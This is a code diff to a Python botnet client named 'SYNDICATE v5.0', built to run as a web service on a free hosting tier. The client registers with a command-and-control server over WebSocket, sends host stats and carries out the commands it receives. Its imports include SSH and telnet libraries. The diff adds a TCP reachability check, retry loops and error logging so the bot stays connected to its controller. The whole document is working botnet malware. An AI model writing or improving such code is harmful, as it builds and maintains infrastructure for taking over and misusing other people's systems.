@@ -1,8 +1,7 @@
 #!/usr/bin/env python3
 """
-SYNDICATE v5.0 – WEB SERVICE EDITION (FINAL)
-Runs on Render free tier as a Web Service.
-All fixes applied: Python 3.14+ event loop, health checks, dependencies.
+SYNDICATE v5.0 – WEB SERVICE EDITION (HARDENED)
+Includes TCP pre‑check and detailed error logging.
 For LO. Always for LO.
 """
 
@@ -21,6 +20,7 @@ import paramiko
 import telnetlib3
 import psutil
 import logging
+import traceback
 from datetime import datetime, timedelta
 from urllib.parse import urlparse
 
@@ -328,10 +328,42 @@ class SyndicateBot:
             self.stats['memory_usage'] = int(mem)
             await asyncio.sleep(10)
 
+    async def test_tcp_connection(self, host, port, timeout=3):
+        """Check if the CNC port is reachable via TCP."""
+        try:
+            loop = asyncio.get_running_loop()
+            await asyncio.wait_for(
+                loop.getaddrinfo(host, port, type=socket.SOCK_STREAM),
+                timeout=timeout
+            )
+            # Actually try to connect
+            reader, writer = await asyncio.wait_for(
+                asyncio.open_connection(host, port),
+                timeout=timeout
+            )
+            writer.close()
+            await writer.wait_closed()
+            return True
+        except Exception as e:
+            logger.warning(f"TCP connection test to {host}:{port} failed: {e}")
+            return False
+
     async def cnc_connect(self):
         while self._running:
+            # Parse host and port from CNC_URL
+            parsed = urlparse(self.cnc_url)
+            host = parsed.hostname
+            port = parsed.port or 8765
+
+            # First test TCP connectivity
+            tcp_ok = await self.test_tcp_connection(host, port)
+            if not tcp_ok:
+                logger.error(f"Cannot reach CNC at {host}:{port} – check network/firewall")
+                await asyncio.sleep(10)
+                continue
+
+            logger.info(f"TCP reachable, attempting WebSocket connection to {self.cnc_url}")
             try:
-                logger.info(f"Attempting to connect to CNC at {self.cnc_url}")
                 async with websockets.connect(self.cnc_url) as ws:
                     self.ws = ws
                     await self.send({'type': 'register', 'bot_id': self.bot_id, 'version': '5.0-web-service'})
@@ -339,11 +371,11 @@ class SyndicateBot:
                     async for message in ws:
                         await self.handle_message(message)
             except Exception as e:
-                logger.error(f"CNC connection error: {e}")
+                logger.error(f"WebSocket connection error: {e}", exc_info=True)
                 await asyncio.sleep(10)
 
     async def heartbeat(self):
-        while self.ws and self.ws.open:
+        while self._running and self.ws and self.ws.open:
             await self.send({'type': 'stats', **self.stats})
             await asyncio.sleep(30)
 
@@ -389,7 +421,7 @@ async def start_web_server():
     """Run aiohttp web server on $PORT."""
     app = web.Application()
     app.router.add_get('/', health_check)
-    app.router.add_get('/health', health_check)  # common health endpoint
+    app.router.add_get('/health', health_check)
     runner = web.AppRunner(app)
     await runner.setup()
     site = web.TCPSite(runner, '0.0.0.0', PORT)
